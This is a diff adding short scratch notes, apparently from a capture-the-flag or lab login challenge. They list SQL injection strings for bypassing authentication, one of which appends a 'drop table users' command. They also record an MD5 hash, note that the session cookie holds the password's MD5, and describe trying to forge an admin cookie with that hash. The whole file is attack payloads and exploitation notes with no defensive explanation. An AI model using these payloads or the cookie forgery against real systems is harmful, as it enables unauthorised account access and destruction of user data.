@@ -1,0 +1,17 @@
+" OR '1'='1'; drop table users;
+
+"' OR '1'='1'
+
+" and password = "OR '1'='1';
+
+
+
+" OR '1'='1'; SELECT * FROM USERS WHERE "%"="
+[results]
+
+9392c112fcfcd9c0ea278abda910217d
+
+When logged in cookies are:
+username = username
+session = password in MD5
+Will give a bad user error if you change the results to admin:9392c112fcfcd9c0ea278abda910217d
